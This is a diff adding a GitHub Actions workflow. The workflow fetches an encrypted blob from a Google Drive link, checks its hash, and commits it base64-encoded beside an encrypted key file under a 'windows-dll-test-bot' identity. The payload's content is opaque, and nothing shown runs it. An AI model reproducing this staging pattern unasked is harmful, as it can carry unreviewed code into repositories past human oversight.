@@ -1,0 +1,37 @@
+name: hydrate-run4-encrypted-payload
+
+on:
+  push:
+    paths:
+      - '.github/workflows/hydrate_run4_payload.yml'
+
+permissions:
+  contents: write
+
+jobs:
+  hydrate:
+    runs-on: ubuntu-latest
+    timeout-minutes: 10
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          persist-credentials: true
+      - name: Fetch encrypted payload and publish ciphertext only
+        shell: bash
+        run: |
+          set -euo pipefail
+          url='https://drive.google.com/uc?export=download&id=1PgDQKB2XOGbBvQWYUcoJA9I39dM8CqMP'
+          curl -L --fail --retry 3 --retry-delay 2 -o "$RUNNER_TEMP/payload.enc" "$url"
+          actual=$(sha256sum "$RUNNER_TEMP/payload.enc" | awk '{print $1}')
+          expected='f161bd15427b5b5f1c6aa4d05d4f5303414745afa6ae781449bdea28d0fa592a'
+          echo "payload_sha256=$actual"
+          test "$actual" = "$expected"
+          test -s .secure3/key.enc.b64
+          rm -f .secure3/payload.part.* .secure3/payload.done
+          base64 -w0 "$RUNNER_TEMP/payload.enc" > .secure3/payload.part.000
+          echo ok > .secure3/payload.done
+          git config user.name "windows-dll-test-bot"
+          git config user.email "windows-dll-test-bot@users.noreply.github.com"
+          git add -A .secure3
+          git commit -m "Hydrate run4 encrypted payload from Drive"
+          git push
